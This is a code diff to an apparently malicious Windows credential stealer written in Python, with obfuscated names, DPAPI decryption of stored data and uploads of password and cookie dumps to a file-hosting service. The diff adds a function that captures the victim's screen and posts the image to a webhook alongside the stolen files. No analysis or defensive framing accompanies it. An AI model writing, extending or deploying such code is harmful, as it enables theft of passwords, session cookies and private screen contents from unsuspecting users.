@@ -7,6 +7,9 @@ from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from urllib.request import Request, urlopen
+from pyautogui import screenshot
+from random import choices
+from string import ascii_letters, digits
 from json import *
 import time
 import shutil
@@ -103,6 +106,14 @@ def G3tD4t4(blob_out):
     cdll.msvcrt.memcpy(buffer, pbData, cbData)
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
+
+def get_screenshot():
+    path = os.path.realpath(
+    os.path.join(os.getcwd(), os.path.dirname(__file__)))
+    get_screenshot.scrn = screenshot()
+    get_screenshot.scrn_path = os.path.join(
+        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png") # Avoid overwriting / Exceptions
+    get_screenshot.scrn.save(get_screenshot.scrn_path)
 
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
@@ -870,6 +881,9 @@ def GatherAll():
     for file in ["crpassw.txt", "crcook.txt"]: 
         # upload(os.getenv("TEMP") + "\\" + file)
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
+    get_screenshot()
+    scrn_files =  {"screenshot": open(get_screenshot.scrn_path , "rb")}
+    requests.post(wh00k,files=scrn_files)
 
 def uploadToAnonfiles(path):
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
